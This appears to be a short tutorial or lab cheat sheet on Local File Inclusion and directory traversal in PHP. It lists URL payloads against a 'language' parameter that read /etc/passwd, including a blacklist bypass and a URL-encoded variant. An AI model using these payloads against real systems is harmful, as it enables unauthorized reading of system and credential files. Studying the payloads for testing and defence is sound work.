# File Inclusion/Directory Traversal

## Local File Inclusion

### Basic LFI

Get /etc/passwd  
index.php?language=/etc/passwd

### LFI with Path Traversal

Get /etc/passwd when string passed to the `include()` function  
index.php?language=../../../../../../../../../etc/passwd or  
index.php?language=/../../../../../../../../../etc/passwd

### LFI with Blacklisting

Scripts can employ search and replace techniques to avoid path traversals. For example:

```text
$language = str_replace('../', '', $_GET['language']);
```

Can be bypassed like so  
index.php?language=....//....//....//....//....//....//....//....//etc/passwd

### **Bypass with URL Encoding**

The characters `../` can be URL encoded into `%2e%2e%2f`, which will bypass the filter.

In the last example `....//` can be URL encoded into `%2e%2e%2e%2e%2f%2f`.

The payload `%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd` will bypass the filter in the section above.  
index.php?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

### LFI with Appended Extension

Scripts can manually append a `.php` or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.  
The files for this section are present in the `LFI_extension folder`.  


\*\*\*\*

